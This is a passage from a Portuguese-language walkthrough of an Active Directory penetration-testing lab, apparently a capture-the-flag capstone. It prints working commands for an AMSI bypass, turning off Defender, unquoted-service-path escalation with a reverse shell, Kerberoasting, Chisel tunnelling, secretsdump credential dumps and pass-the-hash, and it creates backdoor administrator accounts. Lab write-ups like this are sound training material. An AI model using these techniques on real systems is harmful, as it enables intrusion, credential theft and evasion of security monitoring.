Nada muito relevante foi encontrado até o momento, então partiremos para a utilização de algumas ferramentas conhecidas de enumeração. O módulo escolhido foi o `PowerView`, porém o antivírus estava detectando o arquivo. Para contornar isso, a técnica de evasão utilizada foi a remoção de alguns comentários do script e a renomeação do arquivo para algo menos suspeito, como por exemplo `notpv.ps1`.

Uma alternativa viável é executar um comando que desative temporariamente a proteção em tempo real do antivírus, como por exemplo
`Set-MpPreference -DisableRealtimeMonitoring $true`

## 7.3 Módulo `Power-View.ps1`

```
--- Obtendo informações do usuário

PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity mohammad.ahmed
logoncount            : 22404
badpasswordtime       : 5/21/2024 1:53:27 PM
department            : IT
objectclass           : {top, person, organizationalPerson, user}
displayname           : Mohammad Ahmed
lastlogontimestamp    : 5/20/2024 9:27:13 PM
userprincipalname     : mohammad.ahmed@corp.thereserve.loc
name                  : Mohammad Ahmed
lockouttime           : 0
objectsid             : S-1-5-21-170228521-1485475711-3199862024-2000
samaccountname        : mohammad.ahmed
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/20/2024 9:27:13 PM
instancetype          : 4
usncreated            : 402524
objectguid            : a35a91c9-a8e8-4fb3-8256-098572be22e4
sn                    : Ahmed
lastlogoff            : 1/1/1601 12:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
distinguishedname     : CN=Mohammad Ahmed,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc
dscorepropagationdata : {3/20/2023 5:01:14 PM, 1/1/1601 12:00:01 AM}
givenname             : Mohammad
title                 : Help Desk
memberof              : CN=Help Desk,OU=Groups,DC=corp,DC=thereserve,DC=loc
lastlogon             : 5/22/2024 12:13:48 PM
badpwdcount           : 0
cn                    : Mohammad Ahmed
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 2/18/2023 6:26:02 PM
primarygroupid        : 513
pwdlastset            : 3/18/2023 9:28:25 AM
usnchanged            : 1114213




---- Informações do grupo

PS C:\Users\mohammad.ahmed> Get-DomainGroup -Identity 'Help Desk'

usncreated            : 402676
grouptype             : GLOBAL_SCOPE, SECURITY
samaccounttype        : GROUP_OBJECT
samaccountname        : Help Desk
whenchanged           : 2/18/2023 6:35:23 PM
objectsid             : S-1-5-21-170228521-1485475711-3199862024-2005
objectclass           : {top, group}
cn                    : Help Desk
usnchanged            : 402700
dscorepropagationdata : {3/20/2023 5:01:14 PM, 1/1/1601 12:00:01 AM}
memberof              : CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc
distinguishedname     : CN=Help Desk,OU=Groups,DC=corp,DC=thereserve,DC=loc
name                  : Help Desk
member                : {CN=Mohammad Ahmed,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Keith Allen,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Ashley Chan,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc, CN=Emily
                        Harvey,OU=Help Desk,OU=IT,OU=People,DC=corp,DC=thereserve,DC=loc...}
whencreated           : 2/18/2023 6:34:27 PM
instancetype          : 4
objectguid            : ef6d9255-1df6-480e-86f6-ae870f3e490b
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
```

## 7.4 Escalando Privilégios da Rede `21`

Encontrei essa pasta, e ela parece conter algumas informações bastante interessantes.

![](attachment/8a18011d5c47df94a5b4547665d08fdc.png)

Ao encontrar essa pasta e perceber que praticamente tudo nela gira em torno de backups, iniciei a busca por serviços e tarefas agendadas relacionados. Como se trata de uma pasta criada manualmente, e não pertencente ao sistema, esse nível de reconhecimento se torna necessário.

![](attachment/bbfab15ea5ec6eaaa4d7f0873715c6e1.png)

![](attachment/4f5a1ce3fcdc21dd00e4c2bf6b24844e.png)

Certo. Percebemos que existe um serviço de Backup, porém está `stopped`.

```
PS C:\Backup Service> Get-WmiObject win32_Service | Select-Object Name, State, Startmode, description, PathName, DisplayName, startname | Select-String -Pattern 'backup'

@{Name=Backup; State=Stopped; Startmode=Manual; description=; PathName=C:\Backup Service\Full Backup\backup.exe;
DisplayName=Backup; startname=LocalSystem}

@{Name=serviceName; State=Stopped; Startmode=Manual; description=; PathName=C:\Backup Service\Full Backup\backup.exe;
DisplayName=serviceName; startname=LocalSystem}

@{Name=VSS; State=Stopped; Startmode=Manual; description=Manages and implements Volume Shadow Copies used for backup and other
purposes. If this service is stopped, shadow copies will be unavailable for backup and the backup may fail. If this service is
disabled, any services that explicitly depend on it will fail to start.; PathName=C:\Windows\system32\vssvc.exe;
DisplayName=Volume Shadow Copy; startname=LocalSystem}
```

**Aqui está uma informação muito importante.** 
"`PathName=C:\Backup Service\Full Backup\backup.exe; DisplayName=Backup; startname=LocalSystem}`"

Isso releva que esse serviço está rodando como "**LocalSystem**". Outro detalhe muito importante está vulnerável a caminhos de serviço não citados.

Portanto, explorar este serviço nos concederá acesso de Administrador Local na máquina `WRK1`.

O Objetivo agora é: Pegar uma shell reversa que faça o `bypass` no Antivirus.

[Shell Reversa](https://github.com/izenynn/c-reverse-shell)

Após baixar a shell precisamos fazer algumas configurações
1. `./change_client.sh 12.100.1.8 9009`
	-  Esse IP é o da VPN (aquele arquivo que capturamos, lembra?)
	  
2. `i686-w64-mingw32-gcc-win32 -std=c99 windows.c -o rsh.exe -lws2_32`
	- `i686-w64-mingw32-gcc-win32` → Compilador MinGW para gerar binários 32-bit Windows.
	- `-std=c99` → Usa a especificação C99.
	- `-o rsh.exe` → Define o nome de saída como `rsh.exe`.
	- `-lws2_32` → Faz **link com a biblioteca de sockets do Windows** (`ws2_32.lib`), necessária para usar `socket()`, `connect()`, etc.
	  
3. Agora precisamos enviar para a máquina. O Método que eu usei foi o abrindo um servidor com o Python (atacante) e baixando (vítima)

Após concluir esses passos, é necessário mover o arquivo `rsh.exe` para a pasta do serviço de backup, renomeando-o para `Full.exe`, e então iniciar o serviço com o comando `net start backup`.

![](attachment/39842fa09069d23e7a7e88c6951952d6.png)

## 7.5 Persistindo

`net user antr4x 'invasao140!@' /add`
![](attachment/c63486cfc1b62d6abcce93682084555e.png)

`net localgroup Administrators antr4x /add`
![](attachment/b671a84bcf0e7fec4819b18972b30b1e.png)

`net localgroup "Remote Desktop Users" antr4x /add`
![](attachment/24b86fb2701e51f87e0d2bca5ecf43e1.png)


# Quarta Flag
![](attachment/05726f16081a64fb4597b344ede8b4c6.png)

# 8. Vamos para a próxima máquina

## 8.1 Enumerando a `WRK1`

![](attachment/31ab2594a33312014ad44451faeebb96.png)

Ao analisar as pastas dos usuários, a maioria aparenta pertencer a contas comuns. No entanto, há um usuário em particular que chamou minha atenção e que pretendo investigar mais a fundo: o `svcOctober`.

```
PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcOctober

logoncount            : 14
badpasswordtime       : 1/1/1601 12:00:00 AM
distinguishedname     : CN=svcOctober,OU=Services,DC=corp,DC=thereserve,DC=loc
objectclass           : {top, person, organizationalPerson, user}
displayname           : svcOctober
lastlogontimestamp    : 3/24/2023 8:54:16 PM
userprincipalname     : svcOctober@corp.thereserve.loc
name                  : svcOctober
objectsid             : S-1-5-21-170228521-1485475711-3199862024-1987
samaccountname        : svcOctober
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 3/24/2023 8:54:16 PM
instancetype          : 4
usncreated            : 341698
objectguid            : 11e69fd6-46e7-414b-9c42-3fa7dafe9275
lastlogoff            : 1/1/1601 12:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
dscorepropagationdata : {3/20/2023 5:01:14 PM, 2/15/2023 9:07:45 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname  : mssql/svcOctober
givenname             : svcOctober
memberof              : CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc
lastlogon             : 3/30/2023 10:26:54 PM
badpwdcount           : 0
cn                    : svcOctober
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 2/15/2023 9:07:45 AM
primarygroupid        : 513
pwdlastset            : 2/15/2023 9:07:45 AM
usnchanged            : 527762
```

### 8.1.1 Informações Críticas

| Campo                | Valor                                                      | Importância                     |
| :------------------- | :--------------------------------------------------------- | :------------------------------ |
| samaccountname       | svcOctober                                                 | Nome da conta usado para login  |
| userprincipalname    | svcOctober@corp.thereserve.loc                             | Nome Principal do usuário no AD |
| serviceprincipalname | mssql/svcOctober                                           | **Possui SPN**                  |
| distinguishedname    | CN=svcOctober,OU=Services,DC=corp,<br>DC=thereserve,DC=loc | Passível de Kerberoasting       |

### 8.1.2 Explicando alguns conceitos

#### 8.1.2.1 Tudo sobre SPN

**O que é?**
Um **SPN (Service Principal Name)** é um identificador exclusivo que mapeia **um serviço específico** a **uma conta no Active Directory**

**Formato**
`<serviço>/<nome do host>`

**Para que serve o SPN?**
O SPN permite que o Kerberos saiba **qual conta de serviço deve receber um ticket** (TGS) quando um cliente quer acessar algo.

Ou seja:
- Um cliente diz: “quero acessar `MSSQLSvc/sql01`”.
- O controlador de domínio olha o SPN e diz: “esse serviço está atrelado à conta `svcOctober`”.
- Ele então **gera um TGS criptografado com o hash NTLM da senha de `svcOctober`**, para o cliente entregar ao SQL Server.

**Por que isso é importante para um atacante?**
Aqui está o pulo do gato para o **Kerberoasting**:
1. **Você pode pedir um TGS para qualquer serviço que tenha um SPN publicado**, mesmo sem ter acesso ao serviço em si.
2. O **TGS vem criptografado com o hash da conta de serviço associada ao SPN**.
3. O atacante pode então:
    - Capturar esse TGS,
    - Extrair o hash,
    - Crackear offline com `hashcat` ou `john`.
**Você não precisa comprometer o serviço, só saber o nome da conta e o SPN!**

#### 8.1.2.2 Tudo sobre Kerberoasting

**Imagine o cenário**:
Você é um atacante que já conseguiu **credenciais válidas de um usuário comum no Active Directory**. Esse usuário não tem privilégios administrativos, mas está **logado no domínio**. Como você quer escalar privilégios, decide explorar uma falha **lógica** do próprio protocolo Kerberos.

**O que acontece quando um usuário quer acessar um serviço?**
Quando alguém loga no domínio e tenta acessar um serviço, como um SQL Server, um site interno, ou até uma impressora:
1. Ele já possui um **TGT (Ticket Granting Ticket)**, recebido no momento do login.
2. Com esse TGT em mãos, ele **pede ao controlador de domínio (KDC)** um **TGS (Ticket Granting Service ticket)** para o serviço desejado.
3. O controlador de domínio responde com o TGS, que serve como uma "permissão de entrada" para aquele serviço.
4. Esse TGS é **criptografado com a senha (ou melhor, com o hash NTLM)** da conta que representa o serviço.

**Onde está a oportunidade para o atacante?**
Aqui está o ponto chave:
- Quando o domínio entrega o TGS, **ele não se importa se você realmente precisa do serviço**.
- Ele apenas responde: “toma aí o ticket, foi criptografado com a senha do serviço — se você conseguir usar, ótimo”.
Ou seja, **qualquer usuário autenticado pode pedir TGSs para qualquer serviço com SPN no domínio**.
E o TGS que ele recebe é **como um presente**: ele foi **criptografado com o hash da senha da conta de serviço**.

**O que o atacante faz com esse "presente"?**
O atacante:
- Guarda esse TGS.
- Leva para casa (offline).
- Tenta quebrar esse "presente" — ele sabe que o TGS foi criptografado com o hash da senha da conta de serviço.
- Então, usa força bruta ou dicionários para descobrir **qual senha gera aquele hash** que bate com a criptografia do TGS.
Se ele **consegue descobrir a senha da conta de serviço**, ele pode:
- Logar com essa conta,
- Usar permissões que ela tenha (às vezes até administrativas),
- E escalar privilégios no domínio.

## 8.2 Kerberoasting

### 8.2.1 Remotamente

![](attachment/bb1c5049491bea379a1a0c8a9a49a674.png)
Deu certo? **Não!**

### 8.2.2 Localmente

Primeiro, é necessário importar o módulo [Invoke-Kerbearost](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1) para que possamos realizar o dump dos tickets de serviço.

Primeiramente, enviaremos o módulo para a máquina da vítima e, em seguida, utilizaremos o comando `Import-Module` para carregá-lo.

`Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast`

> `Invoke-Kerberoast -OutputFormat hashcat`
- Executa o **módulo `Invoke-Kerberoast`** (do PowerView ou Empire).
- Ele coleta os **TGSs (tickets de serviço) de contas com SPNs** no domínio.
- A flag `-OutputFormat hashcat` faz com que ele **formate os hashes no estilo que o Hashcat entende** (`$krb5tgs$...`, modo 13100).

> `| % { $_.Hash }`
- O símbolo `%` é **um alias para `ForEach-Object`**.
- Para cada resultado retornado, ele pega apenas o campo `.Hash`, que contém o **hash Kerberos**.
- Isso filtra o conteúdo, **descartando metadados e focando só no hash**.

> `| Out-File -Encoding ASCII hashes.kerberoast`
- Salva os hashes filtrados em um **arquivo chamado `hashes.kerberoast`**. 
- Usa **codificação ASCII** (importante para o Hashcat ler corretamente).
- Agora você tem um arquivo pronto para ataque offline com `hashcat`.

Com isso vai gerar um arquivo com as hashes de e então rodaremos o hashcat

`hashcat -m 13100 kerberos.txt --wordlist /home/arthur-strelow/capstone/generated_passwords.txt2`

![](attachment/dd73ff990f2120dbcceb405fb46b8dc8.png)

Executei o `Netexec` para identificar quais usuários conseguem se autenticar no serviço SMB.
![](attachment/2e80742e6bbf47839d36091204e99a92.png)

> [!Credenciais obtidas até o momento]
> svcScanning:Password1!
> laura.wood:Password1@
> mohammad.ahmed:Password1!

# 9. `BloodHound`
```
PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcScanning
logoncount            : 1
badpasswordtime       : 5/22/2024 3:23:24 PM
distinguishedname     : CN=svcScanning,OU=Services,DC=corp,DC=thereserve,DC=loc
objectclass           : {top, person, organizationalPerson, user}
displayname           : svcScanning
lastlogontimestamp    : 5/22/2024 9:19:59 AM
userprincipalname     : svcScanning@corp.thereserve.loc
name                  : svcScanning
objectsid             : S-1-5-21-170228521-1485475711-3199862024-1986
samaccountname        : svcScanning
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/22/2024 9:19:59 AM
instancetype          : 4
usncreated            : 341680
objectguid            : baaf37c3-6507-4314-9ef9-a7012be29c74
lastlogoff            : 1/1/1601 12:00:00 AM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
dscorepropagationdata : {3/20/2023 5:01:14 PM, 2/15/2023 9:07:06 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname  : cifs/scvScanning
givenname             : svcScanning
memberof              : CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc
lastlogon             : 5/22/2024 3:23:26 PM
badpwdcount           : 0
cn                    : svcScanning
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 2/15/2023 9:07:06 AM
primarygroupid        : 513
pwdlastset            : 2/15/2023 9:07:06 AM
usnchanged            : 1172549

PS C:\Users\mohammad.ahmed> Get-DomainGroup -userName 'svcScanning'
usncreated            : 341777
grouptype             : GLOBAL_SCOPE, SECURITY
samaccounttype        : GROUP_OBJECT
samaccountname        : Services
whenchanged           : 2/15/2023 9:42:50 AM
objectsid             : S-1-5-21-170228521-1485475711-3199862024-1988
objectclass           : {top, group}
cn                    : Services
usnchanged            : 342199
dscorepropagationdata : {3/20/2023 5:01:14 PM, 1/1/1601 12:00:01 AM}
name                  : Services
distinguishedname     : CN=Services,OU=Groups,DC=corp,DC=thereserve,DC=loc
member                : {CN=svcScanning,OU=Services,DC=corp,DC=thereserve,DC=loc, CN=svcMonitor,OU=Services,DC=corp,DC=thereserve,DC=loc, CN=svcEDR,OU=Services,DC=corp,DC=thereserve,DC=loc, CN=svcBackups,OU=Services,DC=corp,DC=thereserve,DC=loc}
whencreated           : 2/15/2023 9:09:35 AM
instancetype          : 4
objectguid            : c27deed9-dd22-4990-bd6f-54275906435f
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc

usncreated             : 12318
grouptype              : GLOBAL_SCOPE, SECURITY
samaccounttype         : GROUP_OBJECT
samaccountname         : Domain Users
whenchanged            : 9/7/2022 8:58:08 PM
objectsid              : S-1-5-21-170228521-1485475711-3199862024-513
objectclass            : {top, group}
cn                     : Domain Users
usnchanged             : 12320
dscorepropagationdata  : {3/20/2023 5:01:14 PM, 9/7/2022 8:58:09 PM, 1/1/1601 12:04:17 AM}
memberof               : CN=Users,CN=Builtin,DC=corp,DC=thereserve,DC=loc
iscriticalsystemobject : True
description            : All domain users
distinguishedname      : CN=Domain Users,CN=Users,DC=corp,DC=thereserve,DC=loc
name                   : Domain Users
whencreated            : 9/7/2022 8:58:08 PM
instancetype           : 4
objectguid             : 31be5ca3-8646-4475-a349-e009ef75cb92
objectcategory         : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
```

Ainda não foi identificado nenhum possível vetor de ataque relacionado a esse usuário. Por isso, utilizaremos o [BloodHound Ofuscado](https://github.com/Flangvik/ObfuscatedSharpCollection/tree/main) (por conta do AV.) para mapear todo o Active Directory e coletar informações detalhadas sobre os usuários de forma mais eficiente.

## 9.1 Evadindo o AV novamente

Primeira eu achei um comando para `"Bypassar"` o análise de Malware

**Primeiro, o que é AMSI?**
**AMSI (Antimalware Scan Interface)** é um mecanismo do Windows que permite que scripts como PowerShell, JavaScript, VBA etc. sejam inspecionados por soluções antivírus **antes de serem executados**.

**Payload completo**: 
```
$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
```


**Primeira Linha**: 
```
$v =[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

- **[Ref]**: É um tipo do .NET, que aqui serve só como ponte para acessar a **Assembly** principal carregada no contexto do PowerShell.
- **[Ref].Assembly**: Pega o assembly base onde o PowerShell está sendo executado.
- **.GetType('System.Management.Automation.AmsiUtils')**:
    - Carrega o tipo interno (classe) `AmsiUtils`, que **não é pública**.
    - Essa classe controla internamente o AMSI no PowerShell.

**Resultado final da linha**: O `$v` agora é a representação da **classe oculta** `AmsiUtils` carregada via reflexão (mesmo que ela não seja acessível diretamente em PowerShell normal).


**Segunda linha**: 
```
$v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
```

**Dividindo a segunda linha**:

``` 
$v."Get`Fie`ld"(...)
```

> Na prática vira: `$v.GetField(...)`
- **GetField** é um método do .NET que permite acessar **variáveis internas (campos) de uma classe**, mesmo que sejam privadas.
- Parâmetro 1: `'amsiInitFailed'`
    - Nome do campo que queremos alterar.
    - Essa variável controla **se o AMSI foi inicializado com sucesso**. Se for `true`, o PowerShell **acha que houve falha e para de usar AMSI**.
- Parâmetro 2: `'NonPublic,Static'`
    - Diz ao GetField que queremos acessar um campo **privado e estático**.



```
.Set`Val`ue`($null, $true)
```

> Na prática vira: `.SetValue($null, $true)`

- **SetValue** define um novo valor para aquele campo (`amsiInitFailed`).
- Primeiro argumento: `$null` → usado porque o campo é **estático**, ou seja, não pertence a nenhuma instância da classe.
- Segundo argumento: `$true` → isso **ativa o "modo falha" do AMSI**, desabilitando a verificação de código malicioso.


**Em termos simples:**
1. **Carregou** a classe secreta `AmsiUtils`;
2. **Acessou** a variável privada `amsiInitFailed`;
3. **Forçou** seu valor para `true`, fazendo o PowerShell achar que o AMSI falhou;
4. **Resultado:** O PowerShell **desativa a varredura AMSI**, permitindo que payloads maliciosos rodem sem bloqueio.



![](attachment/a72dd3319613ae95f035bdc4461c40d4.png)

Neste momento, **estou transferindo para minha máquina o arquivo gerado pelo BloodHound**, a fim de analisá-lo com mais detalhes.
## 9.2 Analisando o Active Directory

Anteriormente, estávamos analisando o usuário "SvcScanning" e tentamos comprometê-lo por meio do ataque Kerberoasting — uma técnica que consiste em extrair o hash da senha de contas de serviço e tentar quebrá-lo offline. Nesse contexto, o melhor caminho para escalada é identificar e explorar os usuários Kerberoastable, ou seja, contas de serviço no Active Directory que possuem SPNs (Service Principal Names) associados.
![](attachment/8d244939b45997140628594518402ea8.png)

Ao analisar todo o caminho de ataque, observamos que o usuário `SVCSCANNING` é membro do grupo `SERVICES@CORP.THERESERVE.LOC` e possui permissão para executar comandos remotos via PowerShell (WinRM) no host `SERVER2.CORP.THERESERVE.LOC`.

# 10. Abusando de Privilégios para Movimentação Lateral

Como temos acesso ao svcScanning, vamos executar comandos remotos para a máquina `server2`.

![](attachment/28ef50fb50ceadfa9e5b2b0fac6989d4.png)

Antes de tudo bora entender que está acontecendo.

## 10.1 Entendendo os Comandos

`$Secpass = ConvertTo-SecureString 'Password1!' -AsPlainText -Force`
- Converte a string `'Password1!'` (uma senha em texto claro) em um **objeto do tipo `SecureString`**.
- Isso é necessário porque o PowerShell exige que senhas sejam fornecidas nesse formato ao criar credenciais.
- A flag `-AsPlainText` indica que a senha está em texto claro.
- A flag `-Force` confirma que você aceita esse risco.


`$Cred = New-Object System.Management.Automation.PSCredential('corp.thereserve.loc\svcScanning', $Secpass)`
- Cria um objeto de **credencial (`PSCredential`)** que combina:
    - O **usuário**: `svcScanning`, no domínio `corp.thereserve.loc`
    - A **senha**: fornecida na variável `$Secpass`
- Esse objeto `$Cred` será usado para autenticação remota.


`Invoke-Command -ComputerName server2.corp.thereserve.loc -Credential $Cred -ScriptBlock {whoami}`
- Executa o comando `whoami` **remotamente no computador `SERVER2`**, usando o usuário `svcScanning`.
- `Invoke-Command` é usado para **PowerShell Remoting (WinRM)**.
- O comando `whoami` retorna **o nome do usuário atual que está executando o comando** (deve ser `corp\svcscanning`).


`Invoke-Command -ComputerName server2.corp.thereserve.loc -Credential $Cred -ScriptBlock {hostname}`
- Semelhante ao anterior, mas o comando `hostname` retorna **o nome da máquina remota**, ou seja, **`server2`**.
- Isso ajuda a verificar se a conexão foi feita corretamente com o host esperado.


**RESUMO:**

| Linha | O que faz                                               |
| ----- | ------------------------------------------------------- |
| 1     | Converte senha em formato seguro (`SecureString`)       |
| 2     | Cria objeto de credencial com usuário e senha           |
| 3     | Executa `whoami` remotamente usando essas credenciais   |
| 4     | Executa `hostname` remotamente usando essas credenciais |

## 10.2 Criação do Túnel com CHISEL

Sabemos que a máquina **`server2`** apresenta a vulnerabilidade que desejamos explorar. No entanto, a máquina atacante **não tem acesso direto** a ela, pois `server2` está em uma rede interna, isolada da nossa origem. Para superar essa limitação, precisamos criar um **túnel de comunicação** que permita atravessar essa barreira de rede. Existem duas formas principais de construir essa ponte: **utilizando o Chisel** ou **via SSH**.

Neste caso, optaremos pelo uso do **Chisel**, uma ferramenta leve e eficiente para tunelamento reverso. Contudo, como a porta SSH da máquina comprometida está exposta, também seria possível criar um usuário e estabelecer um túnel via SSH — o que pode ser considerado como alternativa.

**Máquina Atacante**
`chisel server -p 9001 --reverse`
- `-p`: Porta escolhida para a máquina da vítima conectar
- `--reverse`: Fará uma conexão reversa
![](attachment/962069e1d6e2f617dd1ca31f2136203a.png)

**Máquina Vítima/Comprometida**
`.\chisel.exe client 12.100.1.8:9001 R:socks`
- `R:socks`: Indica que deseja criar um túnel reverso
	- `R:`: Reverse Tunneling
	- `socks`: Túnel será um servidor SOCKS5

Para validar que o túnel está funcionando corretamente e que conseguimos **acessar máquinas internas da rede**, utilizaremos o **Evil-WinRM**.
`proxychains -q evil-winrm -i 10.200.89.32 -u svcScanning -p 'Password1!'`
![](attachment/2269cb2cf33bd70d5046aeadecbb402c.png)


# Quinta Flag
![](attachment/cca0b821ce502b85dabd902343daf169.png)

# Sexta Flag
![](attachment/0d340fb025c7a1a1604f206ec0757a74.png)


# 11. Comprometendo o domínio CORP

Ao analisarmos novamente o gráfico gerado pelo BloodHound, observamos que a máquina **SERVER2** — que acabamos de comprometer — possui a permissão **GenericWrite** sobre a **GPO de Backup de DC**. Essa política de grupo está vinculada ao grupo **Domain Controllers** e, consequentemente, à máquina **CORPDC**. Caso consigamos explorar essa permissão, será possível **influenciar os controladores de domínio**, o que nos permitirá obter **acesso privilegiado ao Domain Controller (DC)**.
![](attachment/8d244939b45997140628594518402ea8.png)


Utilizando o script `GetUserSPNs.py`, foi possível solicitar tickets de serviço (TGS) para contas de serviço registradas no controlador de domínio que possuem Service Principal Names (SPNs) configurados. Essas contas são potencialmente vulneráveis a ataques de Kerberoasting.

- **SPN (Service Principal Name):**  
    É um identificador que associa um serviço a uma conta de usuário no Active Directory. Exemplo: `MSSQLSvc/db01.corp.local:1433`.
- **Contas Kerberoastáveis:**  
    Quando um serviço (como SQL, HTTP, etc.) é vinculado a uma conta de usuário do AD (em vez de uma conta de computador), essa conta pode ser alvo de **Kerberoasting**.

![](attachment/67cc53a8adc6520e9bbcb256993d35dd.png)
Após enumerar contas de serviço no Active Directory com o script `GetUserSPNs.py`, extraímos os hashes TGS associados aos SPNs configurados. Esses tickets, criptografados com a senha NTLM da conta de serviço, foram salvos em um arquivo de texto. Reunimos todas as hashes coletadas e utilizamos a ferramenta `hashcat` para realizar um ataque offline com o objetivo de descobrir as senhas das contas de serviço, explorando a vulnerabilidade conhecida como Kerberoasting.

![](attachment/9cc2a6b18741d98795f32929bac7e817.png)

**Depois de alguns dias quebrando a cabeça tentando acessar via RDP as máquinas com final `.31 e .32`, testando diferentes abordagens sem sucesso, finalmente encontrei uma possível solução para esse impasse.**

## 11.1 Dumpando e Analisando os "Segredos" (`secretsdump.py`)

A alternativa que funcionou foi utilizar o script `secretsdump.py`, do framework Impacket, que permite extrair remotamente informações sensíveis de sistemas Windows, como hashes de senha, credenciais em cache, senhas em texto claro, segredos do LSA, chaves Kerberos, entre outros dados valiosos para movimentação lateral ou escalonamento de privilégios.

`proxychains -q secretsdump.py corp.thereserve.loc/svcScanning:'Password1!'@10.200.89.31`

- `corp.thereserve.loc`: 10.200.89.11
- `@10.200.89.31`: IP do alvo (`Server1`), onde o script coleta os dados

![](attachment/31afb6cd3a9a0c2b2076524a88b26f96.png)

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
==Administrator:500:aad3b435b51404eeaad3b435b51404ee:e2c7044e93cf7e4d8697582207d6785c:::==
Muito Importante por ser a HASH do Administrator (500 = RID do Administrador) então caso seja viável pegar essa HASH e tentar quebrar com o HASHCAT(`-m 1000`)

[*] Dumping cached domain logon information (domain/username:hash)
==CORP.THERESERVE.LOC/Administrator:$DCC2$10240#Administrator#b08785ec00370a4f7d02ef8bd9b798ca: (2023-04-01 03:13:47)==
São hashes de logons armazenadas em cache, úteis para usar o HASHCAT (`-m 2100`) para cracking offline.

[*] $MACHINE.ACC 
==CORP\SERVER1$:aes256-cts-hmac-sha1-96:50003969cb4cc89c4a8d1bd379a00ed50e2dcf4f6aa6849f9611959ef8d7fa13==
Isso são chaves Kerberos da conta da máquina - Úteis em ataques de pass-the-ticket ou Golden Ticket

[*] DPAPI_SYSTEM 
==dpapi_machinekey:0xb4cfb5032a98c1b279c92264915da1fd3d8b1a0d
dpapi_userkey:0x3cddfc2ba786e51edf1c732a21ffa1f3d19aa382==
Chaves usadas para descriptografar dados protegidos com DPAPI

[*] NL$KM 
 ==0000   8D D2 8E 67 54 58 89 B1  C9 53 B9 5B 46 A2 B3 66   ...gTX...S.[F..f
 0010   D4 3B 95 80 92 7D 67 78  B7 1D F9 2D A5 55 B7 A3   .;...}gx...-.U..
 0020   61 AA 4D 86 95 85 43 86  E3 12 9E C4 91 CF 9A 5B   a.M...C........[
 0030   D8 BB 0D AE FA D3 41 E0  D8 66 3D 19 75 A2 D1 B2   ......A..f=.u...==
 Chave mestra de autenticação NTLM

> [!ESSA É A PARTE MAIS IMPORTANTE! - Credencial Capturada]
> [*] _SC_SYNC 
> svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G


**Chegou o momento de aplicar o mesmo processo no controlador de domínio (10.200.89.102), com o objetivo de extrair ainda mais informações sensíveis.**

## 11.2 Conseguindo acesso ao Administrator
Ao executar o `secretsdump.py` novamente, desta vez utilizando as credenciais válidas do DC, conseguimos com sucesso obter a **hash NTLM da conta Administrator**, um passo crucial para a escalada de privilégios e controle do ambiente.

`proxychains -q secretsdump.py corp.thereserve.loc/svcBackups:'q9nzssaFtGHdqUV3Qv6G'@10.200.89.102`

![](attachment/43330cfed3087b10ee1ed9cb387533f3.png)

> [!Hash do Administrator]
> d3d4edcc015856e386074795aea86b3e

`proxychains -q evil-winrm -i 10.200.89.102 -u Administrator -H d3d4edcc015856e386074795aea86b3e`

![](attachment/301d1c4d0a403fcb294d7a307c8873fa.png)

## 11.3 Criação de Conta com Privilégios Administrativos
### 11.3.1 `net user local`

Como estamos operando diretamente no "CorpDC", a criação dessa conta faz sentido do ponto de vista hierárquico, já que estamos em uma máquina com autoridade elevada no domínio. Se estivéssemos em uma estação comum ou em um servidor com privilégios apenas locais — mesmo com permissões administrativas — o impacto seria limitado, pois a conta criada seria local e não teria influência sobre o domínio. Neste caso, porém, a criação de um usuário no controlador de domínio permite acesso abrangente ao ambiente corporativo, justificando a ação.

```
net user antr4x 'invasao140@' /add
net localgroup Administrators antr4x /add
net localgroup "Remote Desktop Users" antr4x /add
```

![](attachment/4bf86850b0993cc744ddcce5956302a1.png)

### 11.3.2 Criação da conta no `Active Directory`
```
New-ADUser -Name "<nome exibido do usuario>" -SamAccountName "<nome de login>" -UserPrincipalName "<nome de login no estilo e-mail (user@dominio)>" -GivenName "<Primeiro nome>" -Surname "<Sobrenome>" -Enabled $true -ChangePasswordAtLogon $false -AccountPassword(ConvertTo-SecureString -AsPlainText "<Senha>" -Force)

Enable-AdAccount -Identity "<samAccountName>"

Add-ADGroupMember -Identity "Domain Admins"-Members <samAccountName>
```

![](attachment/e12653d043bfc22204f46a102ea6e842.png)

